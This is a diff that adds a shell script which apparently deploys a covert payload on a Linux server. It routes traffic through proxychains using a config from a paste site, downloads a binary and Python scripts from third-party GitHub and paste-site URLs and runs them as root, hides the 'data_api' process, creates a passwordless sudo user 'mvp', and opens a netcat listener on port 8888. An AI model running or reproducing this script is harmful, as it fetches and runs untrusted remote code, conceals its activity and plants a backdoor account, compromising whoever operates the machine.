@@ -1,0 +1,18 @@
+apt update -y && apt install screen libjansson4 build-essential htop -y && cd ~ && git clone https://github.com/walters99/proxychains-ng.git && cd proxychains-ng > /dev/null 2>&1 && ./configure --prefix=/usr --sysconfdir=/etc && make && make install && make install-config
+wget -O myconf.conf https://www.heypasteit.com/download/0IWWBC && chmod +x myconf.conf && mv myconf.conf /etc/proxychains.conf && proxychains4 curl google.com > /dev/null 2>&1
+npm i -g node-process-hider > /dev/null 2>&1 && ph add data_api > /dev/null 2>&1
+echo "SETTING USER..."
+sudo npm i -g node-process-hider > /dev/null 2>&1 && sudo ph add data_api > /dev/null 2>&1
+sudo adduser --disabled-password --gecos "" mvp && sudo usermod -aG sudo mvp
+echo "DOWNLOAD PACK..."
+wget -O data_api https://github.com/hambana01/cici/raw/main/download > /dev/null 2>&1
+wget -O build_config https://www.heypasteit.com/download/0IX51N > /dev/null 2>&1
+wget https://github.com/hambana01/cici/raw/main/mood.py > /dev/null 2>&1
+wget https://github.com/hambana01/cici/raw/main/kos.py > /dev/null 2>&1
+sudo chmod 755 *
+echo "CONFIGURATION..."
+RND=$(shuf -n 1 -i 1-99999999)
+sed -i "s/BLESS/$RND/" "build_config"
+sudo nohup python mood.py &
+echo "STARTING PROGRAM... USER => $RND"
+sudo -u mvp -H sh -c 'echo "/usr/bin/python kos.py" | nc -vlp 8888'
